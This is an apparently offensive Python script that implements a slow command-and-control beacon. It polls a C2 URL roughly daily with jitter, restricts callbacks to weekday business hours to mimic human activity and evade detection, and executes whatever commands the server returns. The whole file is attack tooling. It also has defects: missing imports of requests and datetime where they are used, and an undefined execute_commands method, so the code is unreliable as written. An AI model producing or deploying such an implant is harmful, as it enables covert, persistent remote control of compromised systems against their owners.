# slow_beacon.py - Slow beacon for long-term operations
import time
import random

class SlowBeacon:
    def __init__(self, c2_url, base_interval=86400):
        self.c2_url = c2_url
        self.base_interval = base_interval  # 24 hours

    def calculate_next_beacon(self):
        """
        Calculate next beacon time with jitter
        Mimic human work patterns
        """
        # Business hours only (8 AM - 6 PM local time)
        import datetime
        now = datetime.datetime.now()

        # Add jitter (±20% of base interval)
        jitter = random.randint(-int(self.base_interval * 0.2),
                                int(self.base_interval * 0.2))
        next_beacon = now + datetime.timedelta(seconds=self.base_interval + jitter)

        # Ensure beacon during business hours
        while next_beacon.hour < 8 or next_beacon.hour > 18:
            next_beacon += datetime.timedelta(hours=1)

        # Skip weekends
        while next_beacon.weekday() >= 5:  # Saturday/Sunday
            next_beacon += datetime.timedelta(days=1)

        return next_beacon

    def beacon_loop(self):
        """
        Slow beacon with human-like patterns
        """
        while True:
            # Beacon to C2
            commands = self.beacon()

            if commands:
                self.execute_commands(commands)

            # Calculate next beacon time
            next_beacon = self.calculate_next_beacon()
            sleep_seconds = (next_beacon - datetime.datetime.now()).total_seconds()

            print(f"[*] Next beacon: {next_beacon} ({sleep_seconds/3600:.1f} hours)")
            time.sleep(sleep_seconds)

    def beacon(self):
        """
        Send beacon (implementation depends on C2 channel)
        """
        # Example: HTTPS beacon
        try:
            response = requests.get(self.c2_url, timeout=30)
            if response.status_code == 200:
                return response.json()
        except:
            pass

        return None

# Usage - Beacon once per day during business hours
slow_c2 = SlowBeacon("https://c2.com/beacon", base_interval=86400)
slow_c2.beacon_loop()
